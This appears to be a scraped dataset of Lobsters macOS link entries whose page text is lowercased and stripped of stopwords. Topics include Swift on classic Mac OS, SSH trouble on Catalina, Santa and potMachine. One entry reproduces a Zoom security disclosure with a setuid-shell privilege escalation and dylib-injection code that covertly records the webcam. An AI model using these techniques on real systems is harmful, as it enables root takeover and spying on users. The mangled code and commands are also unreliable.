ahead time okay use app hobbyist project longtime mac developer gwynne raskind also gave twopart highlevel tour toolbox apis mike ash blog several year ago part part fortunately carbon take care fair amount u even mac o okay mpw give u powerpc compiler powerpc assembler powerpc linker classic mac o header file classic mac o library stub linking bunch object binary inspection tool need finished product made lot use trying debug mystery misbehavior pretty good troughtonsmith blog post show enough build entire app run classic idea take object file produced modern compiler feed powerpc linker mean additionally need modified version swift compiler support emitting mpwcompatible object file strippeddown form swift standard library runtime enough read interact carbon header least actual machine running mac o one charger testing using sheepshaver friend nadine provided testing actual machine thing working well go modern compiler classic linker make thing manageable set intermediate goal build app using clang modern c compiler ship xcode clang us llvm infrastructure swift compiler figured could deal object format workflow issue clang move swiftspecific part first thing try figure file format powerpc object file turn format called xcoff searching modern documentation turned ibm reference doc pretty much one else us format encouraging first time started looking project worried compiler write assembly code send mpw powerpc fixing account difference llvm mpw print powerpc assembly however checked see llvm supported xcoff stroke luck turn ibm started adding support xcoff llvm last year part adding support aix run powerpc could ask clang generate xcoff file aix mean short step making generate xcoff file classic mac o point remembered bit trivia apple ibm used close partnership along motorola even made common standard used across platform cpu though perhaps le impact hoped possible aix classic mac o used calling convention procedure could interoperate without extra work got lucky answer nearly yes aix register convention stack convention match one mac o runtime architecture guide meant could feed object file produced clang directly mpw ppclink get working classic mac o binary pretty sure mouth fell open first saw work clang c testc target powerpcibmaixxcoff isystem mpw interfacescincludes integratedas fpascalstrings mpw ppclink testo ppclibraries test work topofmasterbranch llvmclang simple testc end needing change llvm way end really fairly minimal much thanks ibm folk hard part work swift able compile simple test program great milestone fair bit work could get swiftc compile whole bitpaint highlight teach swift ppcaix target mostly involved adding ppc aix case switch statement across swift compiler also involved making simple description swift calling convention clang cribbed arm implementation assuring ppcaix backend okay calling convention using got lucky amount work swift already support arm littleendian powerpc running linux bigendian another ibm architecture piece already place add support pascal string mac first highlevel programming language pascal c default format string throughout toolbox apis pascal string length byte followed string data rather c string string data followed null byte fpascalstrings commandline flag clang support static pascal string syntax phello world p would replaced length string must byte count hacked swift well implementation probably problem enough get simple thing working turn reflection support nearly runtime metadata swift runtime powerful want write much runtime project primarily calling bunch c function beyond though default format swift metadata make heavy use relative addressing mainly reduce startup time learn well symbol pointing inside global llvm xcoff implementation yet support either get working proofofconcept aggressively commented part irgen made use either feature like get static metadata back point reflection something ever interested probably make smol stdlib full swift standard library lot thing need even know implement string world assume unicode logic integrate c code based basic type standard library like unsafemutablepointer ended taking subset standard library source adding additional file commenting thing worked nope even good enough early attempt compiled okay managed crash ppclink tried write test program presumably many symbol standard library cut thing even smaller subset eventually worked course working time modifying compiler get working proofofconcept think ultimately went needed bunch symbol used runtime metadata purpose mentioned nonoptimized build nontrivial program work yet know danger zone might try add thing back rather modify actual swift repo decided keep strippeddown standard library separate find ppcswiftproject repo might good reference someone looking ccompatible runtimeless subset swift perhaps embedded resourceconstrained environment disable jump table llvm optimizes switch statement jump table look like help performance andor code size default implementation jump table also supported llvm xcoff implementation imagine aix folk get around implementing sooner later disabled jump table entirely forcing compiler emit switch series ifs instead check change swift llvmproject repos curious appropriate upstreaming respective project try get one relevant upstreamed point week mysterious failure made change app worked swift worked time change something arbitrary suddenly event register got bad added counter ten event exit app without get trapped unable even quit without restarting virtual machine even seemingly working version friend nadine reported trying use reset command caused app crash going decided get bottom something strange seen earlier even clang version program work correctly turned optimization possible bug ibm newlyadded aix support powerpc support since common platform even llvm optimization could aix classic mac o really similar thought code agreeing system code thing supposed work could optimized code using instruction sheepshaver support though really seem match symptom symptom weird local variable getting corrupted others started testing everything could think stack aligned properly stack pointer somehow getting restored properly glue code crosslibrary call trashing data see mac o runtime architecture guide something causing code fragment manager dynamic linker put wrong address crosslibrary call without able rely logging made simplest textual debug output facility could modifying title menu later turned writing stdout mac o automatically result file created could used instead wrote c function tracked current stack pointer make sure getting restored properly made good use dumpxcoff dumppef tool came mpw learned pef pidata patterninitialized data worked tried step cfm relocation hand see mac o runtime architecture guide even started trying decompile actual system library see anything suspicious even though bug actual mac o seemed incredibly unlikely led way learning toolbox rom actually rom boot script compressed set system library called content used rom fortunately sheepshaver already know load meant could decompression manually split individual library yeah got way weed learned lot though finally looked decompiled optimized c version swift version observed variable getting corrupted generalpurpose register supposed okay place put data classic mac o aix mac o x decided trust particularly register used track threadlocal storage aix marked problem went away optimized nonoptimized even fstackprotectorall swift debugging took week unfortunately led project little le ambitious originally wanted future direction get awful lot actually runtime mean dynamic allocation among thing type metadata mean generic optimized away field metadata mean key path optimized away unicode support string arguably could make string without character string using macroman native encoding necessarily look much like today swiftstring bunch standard library thing missing wanted get proofofconcept working also ppclink choking large object file get standard library stuff working probably split swift module somehow mess linkage number way make llvm xcoff backend happy sure multifile build would work even test using carbon mean program ought work older version mac o x well friend nadine tried priority figure wanted try making nice abstraction top toolbox apis wanted make complicated example apps maybe follow putting lot effort making sure could finish april probably get thing neglecting favor project instead summary project took lot time even though know lot compiler hacked way success instead careful maintaining proper software development practice learned lot accomplished goal back mind long time made way end article reward bitpaint running classic mac o x also courtesy nadine stay safe everyone help people around anybody make something project want hear entry posted april filed technical tag swift mac o classic compiler
94,Lobsters,mac,Apple macOS,uncovering (local) security flaws in Zoom's latest macOS client,https://objective-see.com/blog/blog_0x56.html,uncovering local security flaw zoom latest macos client,cleanmy mac x new update macos background jonathan leitschuh felix seele suspicious package local zoom security flaw privilege escalation root noted death installers sniffing authentication reference macos objective sea julia vashchenko job bless u privileged operation macos presentation http objectiveseecomproductsutilitieshtml processmonitor root local zoom security flaw code injection mic camera access well documented zeronights document dylib hijacking o x automatically inherit anyall zoom access rightspermissions conclusion osxfruitfly free oversight knockknock patreon,zoom stand security uncovering local security flaw zoom latest macos client patrick wardle march research tool writing supported friend objectivesee cleanmy mac x update zoom patched bug version detail see new update macos background given current worldwide pandemic government sanctioned lockdown working home become norm thanks zoom leader modern enterprise video communication well way becoming household verb result stock price soared however value either cyber security privacy may want think twice using macos version app blog post start briefly looking recent security privacy flaw affected zoom following transition discussing several new security issue affect latest version zoom macos client though new issue discus today remain unpatched local security issue successfully exploited required malware attacker already foothold macos system though zoom incredibly popular rather dismal security privacy track record june security researcher jonathan leitschuh discovered trivially exploitable remote vulnerability zoom client mac allow ed malicious website enable camera without permission vulnerability allows website forcibly join user zoom call video camera activated without user permission additionally ever installed zoom client uninstalled still localhost web server machine happily reinstall zoom client without requiring user interaction behalf besides visiting webpage reinstall feature continues work day jonathan leitschuh rather hilariously apple forcibly removed vulnerable zoom component user mac worldwide via macos malware removal tool mrt afaik time apple taken draconian action recently zoom suffered rather embarrassing privacy faux pa uncovered io application send ing data facebook even facebook account although zoom quick patch issue removing ir responsible code many security researcher quick point said code never made application first place finally today noted macos security researcher felix seele obts speaker noted zoom macos installer rather shadily performs install job without ever clicking install strictly malicious shady definitely leaf bitter aftertaste application installed without user giving final consent highly misleading prompt used gain root privilege trick used macos malware felix seele preinstall script mentioned felix easily viewed extracted zoom installer package via suspicious package application local zoom security flaw privilege escalation root zoom security privacy track record leaf much desired today felix seele also noted zoom installer may invoke authorizationexecutewithprivileges api perform various privileged installation task decided take closer look almost immediately uncovered several issue including vulnerability lead trivial reliable local privilege escalation root stop heard talk rant apple clearly note authorizationexecutewithprivileges api deprecated used api validate binary executed root local unprivileged attacker piece malware may able surreptitiously tamper replace item order escalate privilege root well defcon presented talk titled death installers cover great detail video blog post sniffing authentication reference macos last week covered great detail well finally insecure api also discussed detail objective sea talk julia vashchenko titled job bless u privileged operation macos noted authorizationexecutewithprivileges api invoked path sip protected readonly binary script issue would thwarted case unprivileged code attacker may able subvert binaryscript question regard zoom utilizing inherently insecure api invoking insecurely may lovely privilege escalation vulnerability discussed defcon presentation easiest way answer question simply run process monitor execute installer package whatever invokes authorizationexecutewithprivileges api observe argument passed securityauthtrampoline setuid system binary ultimately performs privileged action image illustrates flow control initiated authorizationexecutewithprivileges api show item binary script command etc executed root privilege passed first parameter securityauthtrampoline process parameter item editable ie maliciously subverted unprivileged attacker clear security issue let figure zoom executing via authorizationexecutewithprivileges first download latest version zoom installer macos version http zoomusdownload fire macos process monitor http objectiveseecomproductsutilitieshtml processmonitor launch zoom installer package zoompkg user installing zoom running standard read nonadmin user installer may prompt administrator credential expected process monitor observe launching eseventtypenotifyexec usrlibexecsecurityauthtrampoline handle authorization request processmonitorappcontentsmacosprocessmonitor pretty event eseventtypenotifyexec process uid argument usrlibexecsecurityauthtrampoline runwithroot auth userstesterapplicationszoomusapp applicationszoomusapp ppid ancestor signing info csflags signatureidentifier comapplesecurityauthtrampoline cdhash isplatformbinary path usrlibexecsecurityauthtrampoline pid timestamp zoom attempting execute root ie passed securityauthtrampoline bash script named runwithroot user provides requested credential complete install runwithroot script executed root note uid event eseventtypenotifyexec process uid argument binsh runwithroot userstesterapplicationszoomusapp applicationszoomusapp ppid ancestor signing info csflags signatureidentifier comapplesh cdhash isplatformbinary path binsh pid timestamp content runwithroot irrelevant matter local unprivileged attacker piece malware subvert script prior execution root recall authorizationexecutewithprivileges api validate executed since zoom talking answer course yes confirm noting installation process macos installer handle installation pkgs copy runwithroot script userwritable temporary directory tester usersmac pwd tester usersmac l lart total rwxrxrx tester staff mar zoomautenticationtool rwr r tester staff mar zoomentitlements rwr r tester staff mar rwxrxrx tester staff mar runwithroot lovely look like business may able gain root privilege exploitation type bug trivial reliable though requires patience wait installer updater run show following diagram exploit zoom local nonprivileged attacker simply replace subvert runwithroot script install upgrade gain root access example pop root shell simply add following command runwithroot script binksh tmp root wheel tmpksh u tmpksh tmpksh le boom local zoom security flaw code injection mic camera access order zoom useful requires access system mic camera recent version macos requires explicit user approval security privacy point view good thing unfortunately zoom reason unbeknown specific exclusion allows malicious code injected process space said code piggyback zoom mic camera access give malicious code way either record zoom meeting worse access mic camera arbitrary time without user access prompt modern macos application compiled feature called hardened runtime security enhancement well documented apple note hardened runtime along system integrity protection sip protects runtime integrity software preventing certain class exploit like code injection dynamically linked library dll hijacking process memory space tampering apple like think apple attended zeronights moscow noted feature would great addition macos check zoom application validly signed compiled hardened runtime via codesign utility codesign dvvv applicationszoomusapp executableapplicationszoomusappcontentsmacoszoomus identifieruszoomxos formatapp bundle macho thin codedirectory runtime locationembedded authoritydeveloper id application zoom video communication inc authoritydeveloper id certification authority authorityapple root ca flag value runtime indicates application compiled hardened runtime option thus said runtime enforced macos application ok far good code injection attack generically thwarted due zoom fast let dump zoom entitlement entitlement codesigned capability andor exception via codesign utility codesign entitlement applicationszoomusapp executableapplicationszoomusappcontentsmacoszoomus xml version encoding doctype plist public appledtd plist plist version dict key comapplesecurityautomationappleevents key true key comapplesecuritydeviceaudioinput key true key comapplesecuritydevicecamera key true key comapplesecuritycsdisablelibraryvalidation key true key comapplesecuritycsdisableexecutablepageprotection key true dict plist comapplesecuritydeviceaudioinput comapplesecuritydevicecamera entitlement required zoom need userapproved mic camera access however comapplesecuritycsdisablelibraryvalidation entitlement interesting short tell macos hey yah still kinda want hardened runtime please allow library loaded address space word library injection go apple document entitlement well thanks entitlement theory circumvent hardened runtime inject malicious library zoom example access mic camera without access alert variety way coerce remote process load dynamic library load time runtime focus method call dylib proxying stealthy persistent malware author take note short replace legitimate library target ie zoom depends proxy request made zoom back original library ensure legitimate functionality maintained app user remains none wiser another benefit dylib proxying compromise code signing certificate binary however may affect signature application bundle benefit apple runtime signature check eg mic camera access seem detect malicious library thus still afford process continued access mic camera method often ab used handful exploit example previously bypass sip image illustrates one could proxied iasutilities library malicious code would automatically loaded injected macos dynamic linker dyld apple installer prerequisite sip bypass exploit similarly proxy library required zoom malicious library automatically loaded zoom trusted process address space time launched determine library zoom linked read requires thus automatically loaded macos dynamic loader use otool l flag otool l applicationszoomusappcontentsmacoszoomus applicationszoomusappcontentsmacoszoomus systemlibraryframeworkscocoaframeworkversionsacocoa systemlibraryframeworksfoundationframeworkversionscfoundation usrliblibobjcadylib usrliblibsystembdylib systemlibraryframeworksappkitframeworkversionscappkit systemlibraryframeworkscorefoundationframeworkversionsacorefoundation systemlibraryframeworkscoreservicesframeworkversionsacoreservices due macos system integrity protection sip replace system library application vulnerable dylib proxying must load library either application bundle another nonsip location must compiled hardened runtime well unless comapplesecuritycsdisablelibraryvalidation entitlement exception looking zoom library dependency see resolve runpath rpath via otool time l flag otool l applicationszoomusappcontentsmacoszoomus load command cmd lcrpath cmdsize path executablepath framework offset executablepath resolved runtime binary path thus dylib loaded applicationszoomusappcontentsmacos framework specifically applicationszoomusappcontentsframeworks taking peak zoom application bundle confirm presence many framework library loaded whenever zoom launched detail runpaths rpath executable path executablepath well information creating proxy dylib check paper dylib hijacking o x simplicity sake target zoom standalone library versus frameworkbundle library proxy step rename legitimate library example simply prefix underscore running zoom expected crash library requires missing patrick applicationszoomusappcontentsmacoszoomus dyld library loaded referenced reason image found abort trap actually good news mean place library named zoom framework directory dyld blindly attempt load step let create simple library custom constructor automatically invoked library loaded constructor void constructor void char path procpidpathinfomaxsize procpidpath getpid path sizeof path nslog zoom zoom loaded getpid path return save rerun zoom patrick applicationszoomusappcontentsmacoszoomus zoom zoom loaded applicationszoomusappcontentsmacoszoomus hooray library loaded zoom unfortunately zoom exit right away also unexpected ssl say export required functionality ie ssl capability zoom gracefully fails worry beauty dylib proxying shine step via simple linker directive tell zoom hey library implement required ssl functionality looking know point zoom original legitimate ssl library renamed diagrammatically look like create required linker directive add xlinker reexportlibrary path proxy library target linker flag xcode complete creation proxy library must also update embedded reexport path within proxy dylib point original albeit renamed ssl library luckily apple provides installnametool tool purpose patrick installnametool change confirm via otool proxy library reference original ssl libary specifically note proxy dylib contains lcreexportdylib point original ssl library patrick otool l load command cmd lcreexportdylib cmdsize name time stamp wed dec current version compatibility version rerunning zoom confirms proxy library original ssl library loaded zoom perfectly function expected appeal injection library zoom revolves around usergranted access mic camera malicious library loaded zoom processaddress space library automatically inherit anyall zoom access rightspermissions mean user given zoom access mic camera likely scenario injected library equally access device zoom granted access mic camera library able problematically detect silently fail go ahead still attempt access device access prompt originate legitimately zoom thus likely approved unsuspecting user test access inheritance added code injected library record second video webcam avcapturedevice device avcapturedevice defaultdevicewithmediatype avmediatypevideo session avcapturesession alloc init output avcapturemoviefileoutput alloc init avcapturedeviceinput input avcapturedeviceinput deviceinputwithdevice device error nil moviefileoutput avcapturemoviefileoutput alloc init selfsession addinput input selfsession addoutput output selfsession addoutput moviefileoutput selfsession startrunning moviefileoutput startrecordingtooutputfileurl nsurl fileurlwithpath zoommov recordingdelegate self stop recoding second nstimer target self selector selector finishrecord userinfo nil repeat normally code would trigger alert macos asking user confirm access mic camera however injected zoom already given access user additional prompt displayed injected code able arbitrarily record audio video interestingly test captured real brain behind research could malware ab use zoom capture audio video arbitrary time ie spy user zoom installed granted access mic camera yes fact usrbinopen utility support j flag launch app hidden voila conclusion today uncovered two local security issue affecting zoom macos application given zoom privacy security track record surprise absolutely zero people first illustrated unprivileged attacker malware may able exploit zoom installer gain root privilege following due exception entitlement showed inject malicious library zoom trusted process context affords malware ability record zoom meeting simply spawn zoom background access mic webcam arbitrary time former problematic many enterprise utilize zoom likely sensitive business meeting latter problematic affords malware opportunity surreptitious access either mic webcam macos alert andor prompt osxfruitfly anybody honestly care security andor privacy perhaps stop using zoom using zoom must written several free tool may help detect attack first oversight alert anytime anybody access mic webcam thus even attacker malware ab using zoom invisibly background oversight generate alert another free tool knockknock generically detect proxy library almost offensive cybersecurity research facilitate creation powerful defensive tool love blog post andor want support research tool support via patreon page
96,Lobsters,mac,Apple macOS,Swift Package Registry,https://swiftpackageregistry.com/,swift package registry,alamofire chart sdwebimage lottie swiftyjson reactivecocoa vapor rxswift hero snapkit kingfisher mbprogresshud iqkeyboardmanagerswift realm carthage swiftlint fmdb promisekit moya cocoaasyncsocket eureka foldingcell nvactivityindicatorview skeletonview quick swifterswift objectmapper ibanimatable cryptoswift swiftpm rswift purelayout kitura cartography sqliteswift reachability jtapplecalendar reswift facebook swiftgen starscream swiftnio viewanimator swiftdate gitignoreio keychainaccess swiftai fspagerview macaw nuke,alamofire elegant http networking swift chart beautiful chart iostvososx apple side crossplatform mpandroidchart sdwebimage asynchronous image downloader cache support uiimageview category lottie io library natively render effect vector animation swiftyjson better way deal json data swift reactivecocoa cocoa framework objc dynamism binding reactiveswift vapor serverside swift web framework rxswift reactive programming swift hero elegant transition library io tvos snapkit swift autolayout dsl io o x kingfisher lightweight pureswift library downloading caching image web mbprogresshud mbprogresshud customizations iqkeyboardmanagerswift codeless dropin universal library allows prevent issue keyboard sliding cover uitextfielduitextview neither need write code setup required much realm realm mobile database replacement core data sqlite carthage simple decentralized dependency manager cocoa swiftlint tool enforce swift style convention fmdb cocoa objectivec wrapper around sqlite promisekit promise swift objc moya network abstraction layer written swift cocoaasyncsocket asynchronous socket networking library mac io eureka elegant io form builder swift foldingcell octocat foldingcell expanding content cell animation made ramotion nvactivityindicatorview collection awesome loading animation skeletonview elegant way show user something happening also prepare content waiting quick swift objectivec testing framework swifterswift handy collection native swift extension boost productivity objectmapper simple json object mapping written swift ibanimatable design prototype customized ui interaction navigation transition animation app store ready apps interface builder ibanimatable cryptoswift cryptoswift growing collection standard secure cryptographic algorithm implemented swift swiftpm package manager swift programming language rswift strong typed autocompleted resource like image font segue swift project purelayout ultimate api io o x auto layout impressively simple immensely powerful objectivec swift compatible kitura swift web framework http server cartography declarative auto layout dsl swift iphone triangularruler sqliteswift typesafe swiftlanguage layer reachability replacement apple reachability rewritten swift closure jtapplecalendar unofficial apple io swift calendar view swift calendar library io calendar control customizable reswift unidirectional data flow swift inspired redux facebook used integrate facebook platform io tvos apps swiftgen swift code generator asset storyboards localizablestrings get rid stringbased apis starscream websockets swift io osx swiftnio eventdriven network application framework high performance protocol server client nonblocking viewanimator viewanimator brings ui life one line swiftdate parse validate manipulate display date time timezones swift gitignoreio create useful gitignore file project keychainaccess simple swift wrapper keychain work io watchos tvos macos swiftai swift machine learning library fspagerview fspagerview elegant screen slide library extremely helpful making banner slider macaw powerful easytouse vector graphic swift library svg support nuke powerful image loading caching system
97,Lobsters,mac,Apple macOS,"So, uh, I think Catalina 10.15.4 Broke SSH?",https://feed.tyler.io/so-uh-i-think-catalina-10154-broke-ssh/,uh think catalina broke ssh,business website linode forklift sequelpro parallel top result,completely wit end feeling like lost mind half hour ago let start beginning exact date within last week realized unable ssh primary web server one run business website activation server etc sort linchpin tiny software company go get worried first thought maybe server received alert quick check yes still running serving web traffic ok sshd somehow become unresponsive login linode control panel restart service still login odd get connection refused even timeout hang ssh output verbose flag nothing waited minute never timed produced output reboot server problem persists notice oddity able connect using forklift ftp client connects via sftp also sequelpro able connect mysql via ssh well thing get even stranger happening imac try connecting laptop work macbook pro home right next imac refusing login wifi thus ip home ip address got mistakenly banned somehow next ssh different server hop problematic one connects without trouble point thinking maybe permission local private key got screwed blow away ssh recreate key backup still login ok think minute aha ubuntu virtual machine running imac inside parallel ssh try connect rule something odd imac lan ip clear home network perfectly ordinary cable modem router login vm try connect work fine point found imac machine login connected successfully behind public ip using laptop virtual machine iphone ipad verified ssh key correct appropriate permission connect server problematic machine hosting provider linode others aws digitalocean connect imac jump server first start trying think could possibly different one machine dawn started around time updated imac laptop still course virtual machine macos totally grasping straw google ssh find top result apple discussion forum catalina ssh port work using server name instead ip issue started upgrading macos catalina update longer able open ssh connection port greater using server name instead ip yes change port server side prior every test possibly real point connecting via saved hostname defined sshconfig let login simply tying ssh someserver tried ssh ipaddress worked server run alternate ssh port ok time narrow bit changed server listen standard port tried connecting via hostname holy crap worked user apple forum right least case one server happened running nonstandard ssh port connect catalina using hostname instead ip address verify boot mojave catalina vm imac connect fine host machine continues fail internals incredibly head idea underlying problem might one forum poster something totally bizarre yet ssh setup working year last week would love proven wrong told idiot know difference connecting via hostname versus ip address would make specifically using nonstandard port certain threshold sigh even going go want end hacker news bitching catalina hope stuffed post enough keywords anyone else searching google might come across answer
98,Lobsters,mac,Apple macOS,Apple just killed Offline Web Apps while purporting to protect your privacy: why that’s A Bad Thing and why you should care,https://ar.al/2020/03/25/apple-just-killed-offline-web-apps-while-purporting-to-protect-your-privacy-why-thats-a-bad-thing-and-why-you-should-care/,apple killed offline web apps purporting protect privacy bad thing care,apple killed offline web apps purporting protect privacy bad thing care blocking thirdparty cooky good killing offline web apps bad full thirdparty cookie blocking prototype exploring earlier year dat apple care better reevaluation apple v google privacy tale absolute competitive advantage update march updated post xerz collaborative shopping list built dat private clientsideonly pwas hard apple made impossible,apple killed offline web apps purporting protect privacy bad thing care mar apple threw baby bathwater killing offline web apps purportedly protect privacy blocking thirdparty cooky good killing offline web apps bad face webkit announcement yesterday titled full thirdparty cookie blocking sound like something would wholeheartedly welcome unfortunately bit effectively kill offline web apps chance privacyrespecting apps like prototype exploring earlier year based dat block thirdparty cooky yes mean deleting local storage including indexed db etc day effectively block future decentralised apps using browser client side trusted replication node peertopeer network huge blow future privacy apple care though care privacy apple news app sewer surveillance capitalism care privacy implement privacy protection safari apple news app also allow content blocker like better protect privacy apple news app heck could even go ban apps corporation like facebook inc alphabet inc violating privacy core tenet business model instead kill offline web apps almost think app store promote something reevaluation blog post wrote start titled apple v google privacy tale absolute competitive advantage said riddle absolute competitive advantage something competitor would throw away idiot something tell tim cook idiot sadly wrong update march look like apple updated post thanks head xerz add following note web application added home screen mentioned sevenday cap scriptwritable storage gated seven day safari use without user interaction site case safari web application added home screen part safari thus counter day use day use match actual use web application reset timer expect firstparty web application website data deleted web application experience website data deletion please let u know since would consider serious bug intention intelligent tracking prevention delete website data first party web application confused question take jim pick excellent collaborative shopping list built use app safari io without adding home screen leave seven day shopping list deleted thing safari macos home screen shopping list deleted really hope badlythought decision guy take reversed entirely andre garzia also written subject post titled private clientsideonly pwas hard apple made impossible go read one
99,Lobsters,mac,Apple macOS,Who's ready for more Networking History? - all about APPLETALK,https://threadreaderapp.com/thread/1241619297576710145.html,ready networking history appletalk,thread may removed anytime,thread may removed anytime twitter may remove content anytime convert pdf save print later use
100,Lobsters,mac,Apple macOS,Pot Machine Creates Local Vagrant VM with FreeBSD 12 Running on ZFS under LINUX/MACOS,https://github.com/ebarriosjr/potMachine,pot machine creates local vagrant vm freebsd running zfs linuxmacos,description http githubcompizzamigpot macos install virtualbox http install vagrant http compile potmachine binary linux install virtualbox http wwwvirtualboxorgwikilinuxdownloads install vagrant http compile potmachine binary move binary initialize potmachine command option potfile potfile example nginx command available potfile http fileservercomtestrar help bonus mesh command option experimental macos xhyve support macos install xhyve compile potmachine binary,description pot machine creates local vagrant vm running zfs allows developer test local pot http githubcompizzamigpot linux macos implementation try mimic much possible model implemented docker mean potfiles write configuration pot running pot build create freebsd jail based config also possibility create minipot enviroment includes pot nomad consul default program create folder pot contain configuration export made wit pot folder mounted inside vagrant vm vagrant macos install virtualbox http install vagrant http compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine goosdarwin go build pot linux install virtualbox http wwwvirtualboxorgwikilinuxdownloads install vagrant http compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine gooslinux go build pot move binary platform linuxmacos binarie need moved folder inside user path example mv pot usrlocalbinpot initialize potmachine command start vagrant vm running pot without nomad consul traeffic pot machine init virtualbox command option option ip assigns ip potmachine v verbose potfile potfile configuration file si ilar dockerfile file build pot triggered order create pot potfile command pot build need executed also tag build export pot one command example pot build command create pot export zfs dataset compres xz format potexports order push pot dataset need run following command pot push file server requires authentication give pot information running pot login u username passwordstdin fileserverexample information save potconfigjson used every push domain potfile example nginx name tcsnginx copy indexhtml usrlocalwwwnginxdistindexhtml run sed squarterlylatest etcpkgfreebsdconf run pkg install nginx run pkg clean flavour slim cmd nginx command available potfile command description example base freebsd o run inside jail name name pot jail name nginx copy copy local file jail running command run stanza copy indexhtml usrlocalwwwnginxdistindexhtml add downloads remote file pot jail add http fileservercomtestrar arg env variable get added inside creation process pot jail arg varvalue run command executed creation pot jail run pkg install nginx flavour predifined user created script apply pot run done flavour slim expose tell pot port exposed expose memory memory limitation pot jail memory cpu number core assing pot jail cpu env add enviroment variable inside running pot jail env varvalue cmd array command executed pot start cmd nginx g daemon help pot h local command machine creates local enviroment pot jail build build image potfile push push pot image web endpoint login log pot file server remote command usage pot command option command help show help version show pot version config show pot framework configuration lslist list installed pot show show pot information info print minimal information pot top run unix top pot p show running pot init initialize zfs layout deinit deinstall pot system vnetstart start vnet configuration createbase create new base image createfscomp create new f component createprivatebridge create new private bridge create create new pot jail clone clone pot creating new one clonefscomp clone fscomp rename rename pot destroy destroy pot prune destroy running prunable pot copyin copy file directory pot mountin mount directory zfs dataset fscomp pot adddep add dependency setrss set resource constraint getrss get current resource usage setcmd set command start pot setenv set environment variabls inside pot sethosts set etchosts entry inside pot setattr set pot attribute getattr get pot attribute exportports let export tcp port start start jail pot stop stop jail pot term start terminal pot run start open terminal pot snapsnapshot take snapshot pot rollbackrevert restore last snapshot purgesnapshots remove oldall snapshot export export pot file import import pot file url prepare import prepare pot designed jail orchestrator updateconfig update configuration pot bonus mesh want run service mesh local machine use minipot minipot program run nomad consul traeffic pot single vagrant vm give enviroment test develop application local enviroment command option option ip assigns ip potmachine v verbose experimental macos xhyve support macos install xhyve compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine goosdarwin go build pot
101,Lobsters,mac,Apple macOS,Santa: Binary whitelisting system extension for macOS,https://github.com/google/santa,santa binary whitelisting system extension macos,santa doc doc http santareadthedocsio get help santadev issue security policy adminrelated feature intention expectation security performancerelated feature known issue pagezero missing issue sync server upvote moroz zentral screenshots kext signing prebuilt presigned version kext signing certificate contributing contributing disclaimer,santa santa binary authorization system macos consists kernel extension system extension macos monitor execution userland daemon make execution decision based content sqlite database gui agent notifies user case block decision commandline utility managing system synchronizing database server named santa keep track binary naughty nice santa project google macintosh operation team doc santa doc stored doc directory read doc instance available http santareadthedocsio doc include deployment option detail part santa work instruction developing santa get help question otherwise need help getting started santadev group great place believe bug feel free report issue respond soon believe found vulnerability please read security policy disclosure reporting adminrelated feature multiple mode default monitor mode binary except marked blocked allowed run whilst logged recorded event database lockdown mode listed binary allowed run event logging kext loaded binary launch logged either mode unknown denied binary stored database enable later aggregation certificatebased rule override level instead relying binary hash fingerprint executables allowedblocked signing certificate therefore allowblock binary given publisher signed cert across version update binary allowed certificate signature validates correctly rule binary fingerprint override decision certificate ie allowlist certificate blocking binary signed certificate viceversa pathbased rule via nsregularexpressionicu allows similar feature found managed client precursor configuration profile used implementation mechanism application launch restriction via mcxalr binary implementation carry added benefit configurable via regex relying launchservices detailed wiki evaluating rule hold lowest precedence failsafe cert rule put deny rule would block certificate used sign launchd aka pid therefore component used macos binary every o update case entire new version therefore automatically allowed affect binary apple app store use various cert change regularly common apps likewise block santa santa us distinct separate cert google apps intention expectation single system process stop attack provide security santa written intention helping protect user people often download malware trust giving malware credential allowing unknown software exfiltrate data system centrally managed component santa help stop spread malware among large fleet machine independently santa aid analyzing running computer santa part defenseindepth strategy continue protect host whatever way see fit security performancerelated feature inkernel caching allowed binary cached kernel processing required make request done binary nt already cached userland component validate userland component daemon gui agent commandline utility communicate using xpc check signing certificate identical communication accepted kext us kpis kernel extension us provided kernel programming interface job mean kext code continue work across o version known issue santa block execution execve variant nt protect dynamic library loaded dlopen library disk replaced library loaded using dyldinsertlibraries version address pagezero missing issue exploited version macos working also protecting similar avenue attack kext communication security kext accept connection single client time said client must running root nt yet found good way ensure kext accepts connection valid client database protection sqlite database installed permission root user readwrite considering approach secure script santa currently written ignore execution nt binary weighing administration cost v benefit found nt worthwhile additionally number application make use temporary generated script ca nt possibly allowlist would cause problem happy revisit least make option would useful others sync server santactl commandline client includes flag synchronize management server uploads event occurred machine downloads new rule several opensource server sync upvote appenginebased server implement social voting make managing large fleet easier moroz simple golang server serf hardcoded rule simple configuration file zentral centralized service pull data multiple source deploy configuration multiple service alternatively santactl configure rule locally without sync server screenshots tool like santa nt really lend screenshots video instead kext signing kernel extension macos later must signed using appleprovided developer id certificate kernel extension flag without way load extension enable kextdevmode disable sip depending o version two possible solution distribution purpose use prebuilt presigned version kext supply time change made kext code update prebuilt version make use nt prevent making change nonkext part santa distributing make change kext make pull request merge distribute new version presigned kext apply kext signing certificate apple grant broad distribution within organization wo nt issue testing purpose contributing patch project much welcome please see contributing file disclaimer official google product
102,Lobsters,mac,Apple macOS,Compiling a Mac OS 8 application on macOS Sierra,https://www.cocoawithlove.com/blog/porting-from-macos8-to-sierra.html,compiling mac o application macos sierra,doomed development environment programming operating system codewarrior pro introduction application framework powerplant powerplant framework project xcode series mac o x lion carbon version mine resource fork alive quick code analysis handle handle independent review conclusion update macos article update edition download mine github account readme file,armed brand new copy metrowerks codewarrior powermac running mac o wrote basic implementation minesweeper test powerplant application development environment oldest project mine kept wanted see could get running first time year swift objectivec code article diskeating koala deliberately misspelled city zernike polynomial cocoa software cocoa thinking resource fork master pointer block end finally earn admiration family content internet came australia late reached home town aarnet connected university melbourne australian national university noticed time country year working famous movie star something else know long time ago however first read internet clifford stoll book cuckoo egg around year later finally shown friend older brother could gain illicit access internet computer walked one library university campus sat computer login required dozen different cover design book mine looked like library computer fetch diskeating koala ftp client delivered low quality shareware mirrored university michigan sithqx format newswatcher usenet client flame war uuencoded part macgopher rodent family geomyidae delivered menu containing menu containing menu containing actually never made far oddball new program called mosaic program written andreessen center supercomputing champagne specialized drawing gray background behind construction logo fetch newswatcher macgopher mosaic thusly blessed early access world wide web choice start career part time web developer still high school first plain html perl phpfi two step forward one step back never really enjoyed web development helped pay way university little left buy powermac apple countless different computer shared name powermac version bought charcoal black builtin tv tuner making even cooler quadra lusted couple year earlier although shared similarly ridiculous geoport modem powermac director edition tv tuner doomed development environment initially still programming powermac using old copy think c using since think c icon system icon 